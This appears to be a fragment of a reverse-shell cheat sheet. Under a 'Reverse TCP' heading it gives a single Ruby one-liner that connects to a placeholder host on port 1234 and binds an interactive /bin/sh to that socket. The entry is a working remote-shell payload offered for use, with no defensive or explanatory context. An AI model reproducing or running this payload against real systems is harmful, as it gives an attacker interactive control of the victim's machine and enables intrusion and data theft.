# Ruby

## Reverse TCP

ruby -rsocket -e'f=TCPSocket.open("xx.xx.xx.xx",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
